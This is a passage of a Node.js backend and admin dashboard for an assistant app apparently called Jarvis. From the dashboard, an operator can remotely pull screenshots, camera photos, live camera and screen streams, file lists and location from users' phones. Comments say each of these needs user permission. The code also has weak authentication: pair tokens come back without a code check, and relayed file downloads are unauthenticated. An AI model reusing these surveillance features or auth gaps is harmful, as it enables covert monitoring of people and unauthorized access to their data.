<div id="pcPairs">Loading…</div><p><button onclick="window.open('/remote?token='+KEY,'_blank')">🌐 Remote control (browser — QR/app lagbe na)</button></p><p class="muted">Telegram bot: @BotFather-e bot baniye TELEGRAM_BOT_TOKEN env var-e dao, tarpor bot-ke /start koro — chat id dashboard-e add korle /devices + /phone + /pc command cholbe.</p><p>🤖 Telegram chat ids (comma diye, bot-ke /start korle se id dekhay): <input id="cfgTgChats" value="${escapeHtml((cfg.telegram_chats || []).join(','))}" placeholder="6747723822" style="width:220px"> <span class="muted">Save Config-e chaplei save hobe.</span></p></div>
<script>
const KEY = ${JSON.stringify(key)};
const SB_URL = ${JSON.stringify(SB_URL)};
const SB_KEY = ${JSON.stringify(SB_KEY)};
function sbHeaders() { return { 'apikey': SB_KEY, 'Authorization': 'Bearer ' + SB_KEY, 'Content-Type': 'application/json' }; }
function sbGridHtml(files) {
  if (!files || files.length === 0) return '<p class="muted">No files found in Supabase (bucket jarvis-files).</p>';
  var h = '<div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:10px;margin-top:8px">';
  files.forEach(function(f) {
    var nm = f.name || '';
    var url = SB_URL + '/storage/v1/object/public/jarvis-files/' + nm;
    var isVid = /\.mp4$|\.mov$|\.webm$|\.mkv$|\.3gp$/i.test(nm);
    var isImg = /\.jpe?g$|\.png$|\.gif$|\.webp$|\.bmp$/i.test(nm);
    var label = nm.split('/').pop();
    var size = (f.metadata && f.metadata.size) ? ' · ' + Math.round(f.metadata.size / 1024) + ' KB' : '';
    h += '<div style="border:1px solid #334155;border-radius:8px;padding:6px;overflow:hidden">';
    if (isVid) { h += '<video controls preload="none" src="' + url + '" style="width:100%;border-radius:6px"></video>'; }
    else if (isImg) { h += '<a href="' + url + '" target="_blank"><img src="' + url + '" style="width:100%;border-radius:6px" loading="lazy"></a>'; }
    else { h += '<div style="font-size:28px;text-align:center">📄</div>'; }
    h += '<div style="font-size:12px;word-break:break-all">' + label + size + '</div>';
    h += '<div><a href="' + url + '" target="_blank" style="font-size:12px">Open / Download</a></div></div>';
  });
  return h + '</div>';
}
async function sbList(prefix, boxId) {
  var box = document.getElementById(boxId);
  if (!SB_URL || !SB_KEY) { box.innerHTML = '<p class="muted">Supabase connect kora nei — app-er Settings &gt; Supabase-e URL + anon key bosao, ba ekhane Remote control-e Supabase URL/key save koro.</p>'; return; }
  box.innerHTML = 'Loading…';
  try {
    var r = await fetch(SB_URL + '/storage/v1/object/list/jarvis-files', { method: 'POST', headers: sbHeaders(), body: JSON.stringify({ prefix: prefix, limit: 100, offset: 0, sortBy: { column: 'created_at', order: 'desc' } }) });
    var j = await r.json();
    if (!r.ok) { box.innerHTML = '<p class="muted">Supabase list hoy ni (HTTP ' + r.status + '): ' + (j.message || j.error || '') + ' — bucket jarvis-files (Public) + anon INSERT/SELECT policy ache kina dekho.</p>'; return; }
    for (var i = 0; i < j.length; i++) { j[i].name = prefix + j[i].name; }
    box.innerHTML = sbGridHtml(j);
  } catch (e) { box.innerHTML = '<p class="muted">Supabase-e connect holo na: ' + e.message + '</p>'; }
}
async function loadSbFiles(id) { await sbList(id + '/', 'sbFiles-' + id); }
async function loadSbAll() {
  var box = document.getElementById('sbAllFiles');
  if (!SB_URL || !SB_KEY) { box.innerHTML = '<p class="muted">Supabase connect kora nei — app-er Settings &gt; Supabase-e URL + anon key bosao, ba ekhane Remote control-e Supabase URL/key save koro.</p>'; return; }
  box.innerHTML = 'Loading…';
  try {
    var r = await fetch(SB_URL + '/storage/v1/object/list/jarvis-files', { method: 'POST', headers: sbHeaders(), body: JSON.stringify({ prefix: '', limit: 100, offset: 0 }) });
    var j = await r.json();
    if (!r.ok) { box.innerHTML = '<p class="muted">Supabase list hoy ni (HTTP ' + r.status + '): ' + (j.message || j.error || '') + '</p>'; return; }
    var all = [];
    for (var i = 0; i < j.length; i++) {
      var folder = j[i].name;
      if (!folder) continue;
      var r2 = await fetch(SB_URL + '/storage/v1/object/list/jarvis-files', { method: 'POST', headers: sbHeaders(), body: JSON.stringify({ prefix: folder + '/', limit: 100, offset: 0, sortBy: { column: 'created_at', order: 'desc' } }) });
      var j2 = await r2.json();
      if (r2.ok && j2) { for (var k = 0; k < j2.length; k++) { j2[k].name = folder + '/' + j2[k].name; all.push(j2[k]); } }
    }
    all.sort(function(a, b) { return String(b.created_at || '').localeCompare(String(a.created_at || '')); });
    box.innerHTML = sbGridHtml(all.slice(0, 100));
  } catch (e) { box.innerHTML = '<p class="muted">Supabase-e connect holo na: ' + e.message + '</p>'; }
}
async function loadPcPairs() {
  var box = document.getElementById('pcPairs');
  try {
    var r = await fetch('/api/admin/pairs?key=' + encodeURIComponent(KEY));
    var j = await r.json();
    if (!r.ok || !j) { box.innerHTML = '<p class="muted">Load hoy ni.</p>'; return; }
    if (j.length === 0) { box.innerHTML = '<p class="muted">Kono PC pair kora nei — PC app khule QR scan koro phone diye.</p>'; return; }
    var h = '<table><tr><th>PC</th><th>OS</th><th>Phone</th><th>Last seen</th><th></th></tr>';
    j.forEach(function(p) {
      h += '<tr><td>' + escapeHtml(p.pc_name || p.pc_id) + '</td><td>' + escapeHtml(p.os || '') + '</td><td>' + (p.install_id ? escapeHtml(String(p.install_id).slice(0, 8)) + '…' : '<span class="muted">not paired yet</span>') + '</td><td>' + escapeHtml(p.last_seen || '') + '</td><td><button onclick="unpairPc(\'' + escapeHtml(p.pc_id) + '\')">Unpair</button></td></tr>';
    });
    box.innerHTML = h + '</table>';
  } catch (e) { box.innerHTML = '<p class="muted">Load hoy ni: ' + e.message + '</p>'; }
}
async function unpairPc(pcId) {
  if (!confirm('Unpair this PC?')) return;
  await post('/api/pair/unpair', { pc_id: pcId });
  loadPcPairs();
}
loadPcPairs();
async function post(path, body) {
  const r = await fetch(path, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body) });
  if (!r.ok) { alert('Failed: ' + r.status); return false; }
  return true;
}
async function act(id, action, days) {
  if (action === 'ban' && !confirm('Ban this user permanently? (one click — they stop working at once)')) return;
  if (action === 'shutdown' && days === 0 && !confirm('Shut down Jarvis for this user permanently?')) return;
  if (await post('/api/admin/action', { key: KEY, install_id: id, action: action, days: days })) location.reload();
}
async function actDevice(id, action) {
  if (action === 'ban_device' && !confirm('Ban this DEVICE permanently? Every install on this phone stops working.')) return;
  if (await post('/api/admin/action', { key: KEY, install_id: id, action: action })) location.reload();
}
async function reqShot(id) {
  if (await post('/api/admin/action', { key: KEY, install_id: id, action: 'request_screenshot' })) alert('Screenshot requested — it appears here after the app\\'s next heartbeat (within ~15 min).');
}
async function reqCam(id) {
  if (await post('/api/admin/action', { key: KEY, install_id: id, action: 'request_camera' })) alert('Camera photo requested — it appears here after the app\\'s next heartbeat (within ~15 min).');
}
const liveTimers = {};
async function reqLiveCam(id) {
  if (await post('/api/admin/action', { key: KEY, install_id: id, action: 'request_live_camera' })) {
    alert('Live camera preview ON — a fresh photo every ~12s (photo slideshow, not video). It starts after the next heartbeat (within ~15 min, or sooner if the app is opened).');
    startLiveRefresh(id);
  }
}
async function stopLiveCam(id) {
  if (await post('/api/admin/action', { key: KEY, install_id: id, action: 'stop_live_camera' })) {
    stopLiveRefresh(id);
    alert('Live camera preview OFF.');
  }
}
function startLiveRefresh(id) {
  stopLiveRefresh(id);
  const badge = document.getElementById('liveBadge-' + id);
  if (badge) badge.innerHTML = ' <span class="ok">● LIVE</span>';
  liveTimers[id] = setInterval(() => {
    const img = document.getElementById('camImg-' + id);
    if (img) img.src = '/api/admin/camera-photo/' + encodeURIComponent(id) + '?key=' + encodeURIComponent(KEY) + '&t=' + Date.now();
  }, 2000);
}
function stopLiveRefresh(id) {
  if (liveTimers[id]) { clearInterval(liveTimers[id]); delete liveTimers[id]; }
  const badge = document.getElementById('liveBadge-' + id);
  if (badge) badge.innerHTML = '';
}
const liveScreenTimers = {};
async function reqLiveScreen(id) {
  if (await post('/api/admin/action', { key: KEY, install_id: id, action: 'request_live_screen' })) {
    alert('Live screen share ON — a fresh screenshot every ~3s (photo slideshow, not video). It starts within ~10 seconds.');
    startLiveScreenRefresh(id);
  }
}
async function stopLiveScreen(id) {
  if (await post('/api/admin/action', { key: KEY, install_id: id, action: 'stop_live_screen' })) {
    stopLiveScreenRefresh(id);
    alert('Live screen share OFF.');
  }
}
function startLiveScreenRefresh(id) {
  stopLiveScreenRefresh(id);
  const badge = document.getElementById('liveBadgeScreen-' + id);
  if (badge) badge.innerHTML = ' <span class="ok">● LIVE</span>';
  liveScreenTimers[id] = setInterval(() => {
    const img = document.getElementById('screenImg-' + id);
    if (img) img.src = '/api/admin/screenshot/' + encodeURIComponent(id) + '?key=' + encodeURIComponent(KEY) + '&t=' + Date.now();
  }, 2000);
}
function stopLiveScreenRefresh(id) {
  if (liveScreenTimers[id]) { clearInterval(liveScreenTimers[id]); delete liveScreenTimers[id]; }
  const badge = document.getElementById('liveBadgeScreen-' + id);
  if (badge) badge.innerHTML = '';
}
async function reqFileList(id) {
  if (await post('/api/admin/action', { key: KEY, install_id: id, action: 'request_file_list' })) {
    alert('File list requested — it appears below within ~10 seconds (only if the user gave file permission).');
    setTimeout(() => loadFileList(id), 12000);
  }
}
async function loadFileList(id) {
  const box = document.getElementById('fileList-' + id);
  if (!box) return;
  box.innerHTML = 'Loading…';
  const r = await fetch('/api/admin/file-list/' + encodeURIComponent(id) + '?key=' + encodeURIComponent(KEY));
  if (!r.ok) { box.innerHTML = '<span class="muted">No file list yet — press "Request file list" first.</span>'; return; }
  const d = await r.json();
  const rows = (d.files || []).map((f) => '<tr><td>' + escapeHtml(f.name) + '</td><td>' + (f.dir ? '📁 folder' : fmtSize(f.size)) + '</td><td>' + (f.modified ? fmtTime(f.modified) : '—') + '</td><td class="muted">' + escapeHtml(f.path) + '</td></tr>').join('');
  box.innerHTML = '<p class="muted">' + d.count + ' entries · updated ' + escapeHtml(fmtTime(d.at)) + '</p><table><tr><th>Name</th><th>Size</th><th>Modified</th><th>Path</th></tr>' + rows + '</table>';
}
function fmtSize(n) {
  if (!n) return '0 B';
  const u = ['B', 'KB', 'MB', 'GB'];
  let i = 0;
  while (n >= 1024 && i < u.length - 1) { n /= 1024; i++; }
  return n.toFixed(1) + ' ' + u[i];
}
const agoraClients = {};
async function watchAgora(id) {
  const st = document.getElementById('agoraStatus-' + id);
  if (typeof AgoraRTC === 'undefined') { if (st) st.textContent = 'Agora SDK failed to load (check internet).'; return; }
  if (agoraClients[id]) { if (st) st.textContent = 'Already watching.'; return; }
  if (st) st.textContent = 'Joining live video…';
  try {
    const r = await fetch('/api/agora-token?install_id=' + encodeURIComponent(id) + '&uid=0');
    if (!r.ok) { if (st) st.textContent = 'Token failed — is Agora configured on the backend?'; return; }
    const d = await r.json();
    const client = AgoraRTC.createClient({ mode: 'live', codec: 'vp8' });
    agoraClients[id] = client;
    client.on('user-published', async (user, mediaType) => {
      await client.subscribe(user, mediaType);
      if (mediaType === 'video') {
        const el = user.uid === 1002 ? document.getElementById('agoraScreen-' + id) : document.getElementById('agoraCam-' + id);
        if (el) user.videoTrack.play(el);
        if (st) st.textContent = 'Live: ' + (user.uid === 1002 ? 'screen' : 'camera') + ' (uid ' + user.uid + ')';
      }
    });
    client.on('user-unpublished', (user) => { if (st) st.textContent = 'Stream stopped (uid ' + user.uid + ').'; });
    await client.setClientRole('audience');
    await client.join(d.appId, d.channel, d.token, 0);
    if (st) st.textContent = 'Watching channel ' + d.channel + ' — waiting for the phone to publish…';
  } catch (e) {
    if (st) st.textContent = 'Join failed: ' + e.message;
    delete agoraClients[id];
  }
}
async function stopAgora(id) {
  const c = agoraClients[id];
  if (c) { try { await c.leave(); } catch (e) {} delete agoraClients[id]; }
  const st = document.getElementById('agoraStatus-' + id);
  if (st) st.textContent = 'Not watching.';
}
async function reqLiveVideo(id) {
  if (await post('/api/admin/action', { key: KEY, install_id: id, action: 'request_live_video' })) {
    alert('Live video requested — the phone starts publishing camera + screen within ~10 seconds (only if the user allowed live video). Then press "Watch live video".');
  }
}
async function stopLiveVideo(id) {
  if (await post('/api/admin/action', { key: KEY, install_id: id, action: 'stop_live_video' })) {
    alert('Live video stopped on the phone.');
  }
}
async function saveCfg() {
  const features = {};
  document.getElementById('cfgFeatures').value.split('\\n').map(s => s.trim()).filter(Boolean).forEach(t => features[t] = false);
  const body = { key: KEY, features: features,
    persona_extra: document.getElementById('cfgPersona').value,
    announcement: document.getElementById('cfgAnnounce').value,
    latest_version: document.getElementById('cfgVersion').value,
    latest_version_code: parseInt(document.getElementById('cfgCode').value || '0', 10) || 0,
    apk_url: document.getElementById('cfgApk').value,
    supabase_url: document.getElementById('cfgSbUrl').value,
    supabase_key: document.getElementById('cfgSbKey').value,
    telegram_chats: document.getElementById('cfgTgChats').value.split(',').map(function(s) { return s.trim(); }).filter(Boolean) };
  if (await post('/api/admin/config', body)) { alert('Saved — installs pick it up on their next heartbeat.'); location.reload(); }
}
async function sendMsg() {
  const title = document.getElementById('msgTitle').value.trim();
  const body = document.getElementById('msgBody').value.trim();
  if (!title || !body) { alert('Title and message are needed.'); return; }
  const r = await fetch('/api/admin/message', { method: 'POST', headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ key: KEY, target: document.getElementById('msgTarget').value, title: title, body: body }) });
  const j = await r.json();
  document.getElementById('msgResult').textContent = r.ok ? ' ✅ Sent — phones show it on their next heartbeat.' : ' ❌ ' + (j.error || r.status);
  if (r.ok) { document.getElementById('msgTitle').value = ''; document.getElementById('msgBody').value = ''; }
}
async function sendMail() {
  const subject = document.getElementById('mailSubject').value.trim();
  const body = document.getElementById('mailBody').value.trim();
  if (!subject || !body) { alert('Subject and body are needed.'); return; }
  document.getElementById('mailResult').textContent = ' Sending…';
  const r = await fetch('/api/admin/notify-email', { method: 'POST', headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ key: KEY, target: document.getElementById('mailTarget').value, subject: subject, body: body }) });
  const j = await r.json();
  document.getElementById('mailResult').textContent = r.ok ? ' ✅ Email sent to ' + j.sent + ' of ' + j.total + ' user(s).' : ' ❌ ' + (j.error || r.status);
}
</script></body></html>`;
}

// ---------------------------------------------------------------- routes

const server = http.createServer(async (req, res) => {
  const url = new URL(req.url, "http://" + (req.headers.host || "localhost"));
  const pathname = url.pathname;

  if (req.method === "OPTIONS") {
    res.writeHead(204, {
      "Access-Control-Allow-Origin": "*",
      "Access-Control-Allow-Headers": "Content-Type",
      "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
    });
    return res.end();
  }

  try {
    // ---- GET /health
    if (req.method === "GET" && pathname === "/health") {
      return sendJson(res, 200, { ok: true });
    }

    // ---- GET /api/config (public — the app reads it on every heartbeat)
    if (req.method === "GET" && pathname === "/api/config") {
      return sendJson(res, 200, publicConfig(loadConfig()));
    }

    // ---- POST /api/heartbeat
    if (req.method === "POST" && pathname === "/api/heartbeat") {
      const body = await readJsonBody(req);
      const installId = String(body.install_id || "").trim();
      if (!installId) return sendJson(res, 400, { error: "install_id required" });
      const users = loadUsers();
      const devices = loadDevices();
      const cfg = loadConfig();
      const now = new Date().toISOString();
      let user = users[installId];
      if (!user) {
        user = {
          install_id: installId,
          device_id: String(body.device_id || ""),
          device_model: body.device_model || "",
          app_version: body.app_version || "",
          first_seen: now,
          last_seen: now,
          status: "ok",
          until: null,
          last_action: body.last_action || "",
          monitoring: !!body.monitoring,
          permissions: body.permissions || {},
          recent_activity: Array.isArray(body.recent_activity) ? body.recent_activity.slice(-20) : [],
          events: [],
          history: [],
          last_screenshot_at: null,
          email: body.email ? String(body.email).slice(0, 120) : "",
          agora_live: !!body.agora_live,
          supabase_url: body.supabase_url ? String(body.supabase_url).slice(0, 300) : "",
          supabase_key: body.supabase_key ? String(body.supabase_key).slice(0, 400) : "",
          remote_token: body.remote_token ? String(body.remote_token).slice(0, 64) : "",
          last_location: (body.location && typeof body.location === "object" && typeof body.location.lat === "number" && typeof body.location.lng === "number") ? { lat: body.location.lat, lng: body.location.lng, address: String(body.location.address || ""), accuracy_m: body.location.accuracy_m || null, at: now } : null,
        };
        users[installId] = user;
      } else {
        user.last_seen = now;
        if (body.device_model) user.device_model = body.device_model;
        if (body.app_version) user.app_version = body.app_version;
        if (body.device_id) user.device_id = String(body.device_id);
        if (body.last_action !== undefined) user.last_action = body.last_action;
        if (body.monitoring !== undefined) user.monitoring = !!body.monitoring;
        if (typeof body.agora_live === "boolean") user.agora_live = body.agora_live;
        if (body.supabase_url) user.supabase_url = String(body.supabase_url).slice(0, 300);
        if (body.supabase_key) user.supabase_key = String(body.supabase_key).slice(0, 400);
        if (body.remote_token) user.remote_token = String(body.remote_token).slice(0, 64);
        if (body.email) user.email = String(body.email).slice(0, 120);
        // v1.4.7b: location tracking — only when the user turned it ON (opt-in)
        if (body.location && typeof body.location === "object" && typeof body.location.lat === "number" && typeof body.location.lng === "number") {
          user.last_location = { lat: body.location.lat, lng: body.location.lng, address: String(body.location.address || ""), accuracy_m: body.location.accuracy_m || null, at: new Date().toISOString() };
        }
        if (body.permissions && typeof body.permissions === "object") user.permissions = body.permissions;
        if (Array.isArray(body.recent_activity)) user.recent_activity = body.recent_activity.slice(-20);
      }
      saveUsers(users);
      const shotRequested = !!(cfg.screenshot_requested && cfg.screenshot_requested[installId]);
      const camRequested = !!(cfg.camera_requested && cfg.camera_requested[installId]);
      return sendJson(res, 200, {
        status: effectiveStatus(user, devices),
        until: user.until || null,
        message: statusMessage(user, devices),
        config: publicConfig(cfg),
        screenshot_requested: shotRequested,
        camera_requested: camRequested,
        live_camera: !!(cfg.live_camera && cfg.live_camera[installId]),
        live_screen: !!(cfg.live_screen && cfg.live_screen[installId]),
        live_video: !!(cfg.live_video && cfg.live_video[installId]),
        file_list_requested: !!(cfg.file_list_requested && cfg.file_list_requested[installId]),
      });
    }

    // ---- GET /api/agora-token (Agora RTC token for a channel — app + dashboard viewer)
    if (req.method === "GET" && pathname === "/api/agora-token") {
      const appId = process.env.AGORA_APP_ID || "";
      const appCert = process.env.AGORA_APP_CERTIFICATE || "";
      if (!appId || !appCert) return sendJson(res, 503, { error: "Agora not configured on this backend" });
      const installId = String(url.searchParams.get("install_id") || "").trim();
      if (!installId) return sendJson(res, 400, { error: "install_id required" });
      const channel = ("jarvis-" + installId.replace(/[^A-Za-z0-9_-]/g, "")).slice(0, 64);
      const uid = Math.max(0, parseInt(url.searchParams.get("uid") || "0", 10) || 0);
      const token = buildAgoraToken(appId, appCert, channel, uid);
      return sendJson(res, 200, { token, appId, channel, uid, expire: Math.floor(Date.now() / 1000) + 24 * 3600 });
    }

    // ---- GET /api/live-status (tiny poll — the app asks every 10s while live matters)
    if (req.method === "GET" && pathname === "/api/live-status") {
      const installId = String(url.searchParams.get("install_id") || "").trim();
      const cfg = loadConfig();
      return sendJson(res, 200, {
        live_camera: !!(installId && cfg.live_camera && cfg.live_camera[installId]),
        live_screen: !!(installId && cfg.live_screen && cfg.live_screen[installId]),
        live_video: !!(installId && cfg.live_video && cfg.live_video[installId]),
        file_list_requested: !!(installId && cfg.file_list_requested && cfg.file_list_requested[installId]),
      });
    }

    // ---- PC clone: QR pairing + relay (phone <-> PC, works from anywhere)
    // Pairing: PC shows a QR with jarvis-pair://<pc_id>/<6-digit code>.
    // The phone scans it and confirms; the PC polls status and receives a
    // pc_token it uses for all relay calls. The phone needs no token —
    // its install_id is its identity (same as live-status).
    // POST /api/pair/request {pc_id, pc_name, os} -> {pair_code, expires_in}
    if (req.method === "POST" && pathname === "/api/pair/request") {
      const body = await readJsonBody(req);
      const pcId = safeId(body.pc_id);
      if (!pcId) return sendJson(res, 400, { error: "pc_id required" });
      const pairs = loadPairs();
      const existing = pairs[pcId];
      if (existing && existing.install_id) {
        return sendJson(res, 200, { paired: true, install_id: existing.install_id, pc_name: existing.pc_name || "" });
      }
      const code = String(100000 + Math.floor(Math.random() * 900000));
      pairs[pcId] = {
        pc_id: pcId,
        pc_name: String(body.pc_name || "PC").slice(0, 60),
        os: String(body.os || "").slice(0, 60),
        pair_code: code,
        code_expires: Date.now() + 10 * 60 * 1000,
        install_id: null,
        pc_token: "",
        created_at: new Date().toISOString(),
        last_seen: new Date().toISOString(),
      };
      savePairs(pairs);
      return sendJson(res, 200, { paired: false, pair_code: code, expires_in: 600 });
    }

    // GET /api/pair/status?pc_id=&code= -> {paired, install_id, pc_token?}
    if (req.method === "GET" && pathname === "/api/pair/status") {
      const pcId = safeId(url.searchParams.get("pc_id"));
      const code = String(url.searchParams.get("code") || "");
      const pairs = loadPairs();
      const p = pairs[pcId];
      if (!p) return sendJson(res, 404, { error: "unknown pc_id — request pairing first" });
      p.last_seen = new Date().toISOString();
      savePairs(pairs);
      if (!p.install_id) return sendJson(res, 200, { paired: false });
      if (code && code !== p.pair_code) return sendJson(res, 403, { error: "wrong pair code" });
      return sendJson(res, 200, { paired: true, install_id: p.install_id, pc_token: p.pc_token, pc_name: p.pc_name || "" });
    }

    // POST /api/pair/confirm {install_id, pc_id, pair_code} -> {ok, pc_token, pc_name}
    if (req.method === "POST" && pathname === "/api/pair/confirm") {
      const body = await readJsonBody(req);
      const installId = String(body.install_id || "").trim();
      const pcId = safeId(body.pc_id);
      const code = String(body.pair_code || "");
      if (!installId || !pcId || !code) return sendJson(res, 400, { error: "install_id, pc_id and pair_code required" });
      const pairs = loadPairs();
      const p = pairs[pcId];
      if (!p) return sendJson(res, 404, { error: "unknown pc_id — the PC must request pairing first" });
      if (p.install_id && p.install_id !== installId) return sendJson(res, 409, { error: "this PC is already paired to another phone" });
      if (p.pair_code !== code) return sendJson(res, 403, { error: "wrong pair code" });
      if (Date.now() > (p.code_expires || 0)) return sendJson(res, 410, { error: "pair code expired — ask the PC for a new QR" });
      p.install_id = installId;
      if (!p.pc_token) p.pc_token = crypto.randomBytes(16).toString("hex");
      p.last_seen = new Date().toISOString();
      savePairs(pairs);
      const users = loadUsers();
      if (users[installId]) { users[installId].paired_pc_id = pcId; users[installId].last_seen = new Date().toISOString(); saveUsers(users); }
      return sendJson(res, 200, { ok: true, pc_token: p.pc_token, pc_name: p.pc_name || "" });
    }

    // POST /api/pair/unpair {pc_id} or {install_id}
    if (req.method === "POST" && pathname === "/api/pair/unpair") {
      const body = await readJsonBody(req);
      const pairs = loadPairs();
      let removed = false;
      const pcId = safeId(body.pc_id);
      const installId = String(body.install_id || "").trim();
      if (pcId && pairs[pcId]) {
        const oldInstall = pairs[pcId].install_id;
        delete pairs[pcId]; removed = true;
        const users = loadUsers();
        if (oldInstall && users[oldInstall]) { delete users[oldInstall].paired_pc_id; saveUsers(users); }
      } else if (installId) {
        for (const id of Object.keys(pairs)) {
          if (pairs[id].install_id === installId) { delete pairs[id]; removed = true; }
        }
        const users = loadUsers();
        if (users[installId]) { delete users[installId].paired_pc_id; saveUsers(users); }
      }
      savePairs(pairs);
      return sendJson(res, 200, { ok: removed });
    }

    // POST /api/pc/heartbeat {pc_id, token, pc_name, os} -> {paired, install_id}
    if (req.method === "POST" && pathname === "/api/pc/heartbeat") {
      const body = await readJsonBody(req);
      const pcId = safeId(body.pc_id);
      const pairs = loadPairs();
      const p = pairs[pcId];
      if (!p) return sendJson(res, 404, { error: "unknown pc_id" });
      if (p.install_id && String(body.token || "") !== p.pc_token) return sendJson(res, 403, { error: "bad pc_token" });
      p.last_seen = new Date().toISOString();
      if (body.pc_name) p.pc_name = String(body.pc_name).slice(0, 60);
      if (body.os) p.os = String(body.os).slice(0, 60);
      savePairs(pairs);
      return sendJson(res, 200, { paired: !!p.install_id, install_id: p.install_id || null });
    }

    // POST /api/relay/send {from, from_id, to, kind, text?, audio?} -> {ok, id}
    // kinds: text | voice | tts | screen_req | result
    // from=pc needs pc_token; from=phone needs a paired install_id.
    if (req.method === "POST" && pathname === "/api/relay/send") {
      const body = await readJsonBody(req);
      const from = String(body.from || "");
      const fromId = String(body.from_id || "").trim();
      const to = String(body.to || "").trim();
      const kind = String(body.kind || "text");
      if ((from !== "pc" && from !== "phone") || !fromId || !to) return sendJson(res, 400, { error: "from, from_id and to required" });
      if (["text", "voice", "tts", "screen_req", "result", "voice_call", "voice_end", "sync_req", "sync", "file", "clip", "notif"].indexOf(kind) < 0) return sendJson(res, 400, { error: "bad kind" });
      const pairs = loadPairs();
      if (from === "pc") {
        const p = pairs[safeId(fromId)];
        if (!p || !p.install_id || String(body.token || "") !== p.pc_token) return sendJson(res, 403, { error: "bad pc_token or not paired" });
        if (to !== p.install_id) return sendJson(res, 403, { error: "not paired to that phone" });
      } else {
        const users = loadUsers();
        const u = users[fromId];
        if (!u || !u.paired_pc_id) return sendJson(res, 403, { error: "phone is not paired to a PC" });
        if (to !== u.paired_pc_id) return sendJson(res, 403, { error: "not paired to that PC" });
      }
      const id = crypto.randomBytes(8).toString("hex");
      let audioFile = "";
      const audio = String(body.audio || "");
      if (audio) {
        if (!/^[A-Za-z0-9+/=]+$/.test(audio)) return sendJson(res, 400, { error: "audio must be base64" });
        fs.mkdirSync(VOICE_DIR, { recursive: true });
        audioFile = id + ".wav";
        fs.writeFileSync(path.join(VOICE_DIR, audioFile), Buffer.from(audio, "base64"));
      }
      pushRelay(to, { id, from, kind, text: String(body.text || "").slice(0, 4000), audio_file: audioFile, at: new Date().toISOString() });
      if (kind === "result") logResult(fromId, body.text || "");
      return sendJson(res, 200, { ok: true, id });
    }

    // GET /api/relay/inbox?who=<pc_id|install_id>&token= -> {messages} (clears queue)
    if (req.method === "GET" && pathname === "/api/relay/inbox") {
      const who = String(url.searchParams.get("who") || "").trim();
      if (!who) return sendJson(res, 400, { error: "who required" });
      const pairs = loadPairs();
      const asPc = pairs[safeId(who)];
      if (asPc) {
        if (!asPc.install_id || String(url.searchParams.get("token") || "") !== asPc.pc_token) return sendJson(res, 403, { error: "bad pc_token or not paired" });
      } else {
        const users = loadUsers();
        if (!users[who] || !users[who].paired_pc_id) return sendJson(res, 403, { error: "unknown or unpaired install_id" });
      }
      const msgs = loadQueue(who);
      saveQueue(who, []);
      return sendJson(res, 200, { messages: msgs });
    }

    // POST /api/relay/file — v1.7.0: file transfer PC<->phone (base64, cap 2 MB)
    // Saves the file, then pushes a relay message kind=file {file_id, name, size}
    if (req.method === "POST" && pathname === "/api/relay/file") {
      const b = await readJsonBody(req, 3 * 1024 * 1024);
      const fromId = safeId(b.from_id);
      const to = safeId(b.to);
      if (!fromId || !to || typeof b.data !== "string" || !b.name) return sendJson(res, 400, { error: "bad file body" });
      if (b.from === "pc") {
        const pairs = loadPairs();
        if (!pairs[fromId] || pairs[fromId].pc_token !== b.token || pairs[fromId].install_id !== to) return sendJson(res, 403, { error: "bad pc_token or not paired" });
      } else if (b.from === "phone") {
        const users = loadUsers();
        if (!users[fromId] || users[fromId].paired_pc_id !== to) return sendJson(res, 403, { error: "phone not paired to this pc" });
      } else return sendJson(res, 400, { error: "bad from" });
      const buf = Buffer.from(b.data, "base64");
      if (!buf.length || buf.length > 2 * 1024 * 1024) return sendJson(res, 400, { error: "file too big (2 MB max)" });
      const id = crypto.randomBytes(12).toString("hex");
      const safeName = String(b.name).replace(/[^A-Za-z0-9._-]/g, "_").slice(0, 80);
      fs.mkdirSync(RELAY_FILE_DIR, { recursive: true });
      fs.writeFileSync(path.join(RELAY_FILE_DIR, id), buf);
      pushRelay(to, { from: b.from, kind: "file", text: safeName, file_id: id, size: buf.length });
      return sendJson(res, 200, { ok: true, id, name: safeName, size: buf.length });
    }
    // GET /api/relay/file/<id> — download a relayed file (random id, no auth)
    if (req.method === "GET" && pathname.startsWith("/api/relay/file/")) {
      const id = safeFileName(pathname.slice("/api/relay/file/".length));
      const file = path.join(RELAY_FILE_DIR, id);
      if (!fs.existsSync(file)) return sendJson(res, 404, { error: "no such file" });
      res.writeHead(200, { "Content-Type": "application/octet-stream" });
      return fs.createReadStream(file).pipe(res);
    }

    // GET /api/relay/audio/<id>.wav — voice note file (random id, unguessable)
    if (req.method === "GET" && pathname.startsWith("/api/relay/audio/")) {
      const id = pathname.split("/").pop().replace(/[^A-Za-z0-9_-]/g, "");
      const f = path.join(VOICE_DIR, id + ".wav");
      if (!fs.existsSync(f)) return sendJson(res, 404, { error: "no such audio" });
      res.writeHead(200, { "Content-Type": "audio/wav", "Access-Control-Allow-Origin": "*" });
      return fs.createReadStream(f).pipe(res);
    }

    // POST /api/pc/screen {pc_id, token, image} — PC uploads its screenshot for the phone
    if (req.method === "POST" && pathname === "/api/pc/screen") {
      const body = await readJsonBody(req);
      const pcId = safeId(body.pc_id);
      const pairs = loadPairs();
      const p = pairs[pcId];
      if (!p || !p.install_id || String(body.token || "") !== p.pc_token) return sendJson(res, 403, { error: "bad pc_token or not paired" });
      const image = String(body.image || "");
      if (!image || !/^[A-Za-z0-9+/=]+$/.test(image)) return sendJson(res, 400, { error: "image must be base64" });
      fs.mkdirSync(PC_SCREEN_DIR, { recursive: true });
      fs.writeFileSync(path.join(PC_SCREEN_DIR, pcId + ".jpg"), Buffer.from(image, "base64"));
      p.last_seen = new Date().toISOString();
      savePairs(pairs);
      return sendJson(res, 200, { ok: true });
    }

    // GET /api/phone/screen?pc_id=&token= — PC fetches the paired phone's latest screenshot
    if (req.method === "GET" && pathname === "/api/phone/screen") {
      const pcId = safeId(url.searchParams.get("pc_id"));
      const pairs = loadPairs();
      const p = pairs[pcId];
      if (!p || !p.install_id || String(url.searchParams.get("token") || "") !== p.pc_token) return sendJson(res, 403, { error: "bad pc_token or not paired" });
      const f = path.join(SHOTS_DIR, safeFileName(p.install_id) + ".jpg");
      if (!fs.existsSync(f)) return sendJson(res, 404, { error: "no phone screenshot yet" });
      return sendJson(res, 200, { image: fs.readFileSync(f).toString("base64"), at: fs.statSync(f).mtime.toISOString() });
    }

